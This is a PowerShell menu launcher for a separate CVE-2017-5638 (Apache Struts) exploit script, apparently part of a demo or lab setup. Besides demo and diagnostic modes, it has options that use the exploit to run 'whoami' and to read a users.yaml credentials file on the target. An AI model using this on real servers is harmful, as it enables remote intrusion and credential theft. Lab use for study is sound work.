While ($true) {
    $Host.UI.RawUI.FlushInputBuffer()
    Write-Host "Select an option:"
    Write-Host "0: Run in safe demo mode (no real exploit)"
    Write-Host "1: Run with whoami command"
    Write-Host "a: Run with attacking and hack password"
    Write-Host "d: Run diagnostics (find which OGNL step fails)"
    Write-Host "e: Exit"
    $s = Read-Host "option"
    switch ($s.Trim()) {
        '0' {
            Write-Host "Running in safe demo mode...`n"
            & "$PSScriptRoot/exploit_cve_2017_5638.ps1" -DemoMode
        }
        '1' {
            Write-Host "Running with whoami command...`n"
            & "$PSScriptRoot/exploit_cve_2017_5638.ps1" -Command "whoami"
        }
        'a' {
            Write-Host "Running attack script - exfiltrating user credentials...`n"
            # Use the OS-native read command so the JVM shell can execute it.
            #   Windows cmd.exe uses 'type' with backslash paths.
            #   Linux/macOS sh uses 'cat' with forward-slash paths.
            $readCmd = if ($IsWindows) { 'type data\users.yaml' } else { 'cat data/users.yaml' }
            & "$PSScriptRoot/exploit_cve_2017_5638.ps1" -Command $readCmd
        }
        'd' {
            Write-Host "`n=== DIAGNOSTIC: Running levels 1-13 ===" -ForegroundColor Magenta
            Write-Host "Each level adds one step. First failure reveals the problem.`n" -ForegroundColor Magenta
            for ($lvl = 1; $lvl -le 13; $lvl++) {
                Write-Host "--- Diagnostic level $lvl ---" -ForegroundColor Magenta
                & "$PSScriptRoot/exploit_cve_2017_5638.ps1" -DiagLevel $lvl
                Write-Host ""
            }
        }
        'e' {
            Write-Host "Exiting...`n"
            exit
        }
        default {
            Write-Host "Invalid choice. Please enter 0, 1, a, d, or e."
        }
    }
}